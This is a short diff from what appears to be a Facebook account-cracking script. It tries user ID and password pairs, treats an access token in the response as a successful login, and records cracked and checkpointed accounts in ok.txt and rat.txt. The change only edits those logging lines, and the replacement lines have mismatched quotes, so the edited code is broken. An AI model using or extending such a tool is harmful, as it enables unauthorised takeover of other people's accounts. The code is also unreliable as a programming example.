@@ -296,14 +296,14 @@ def crack_select1():
 			if "access_token" in data.text and "EAAA" in data.text:
 				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
-				ok.write(today+" | "+uid+" | "+pass1+"\n")
+				ok.write("+uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in data.json()['error_msg']:
 					print(" \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("rat.txt", "a")
-					cp.write(today+" | "+uid+" | "+pass1+"\n")
+					cp.write("+uid+" | "+pass1+"\n")
 					cp.close()
 					cps.append(uid+pass1)
 				else:
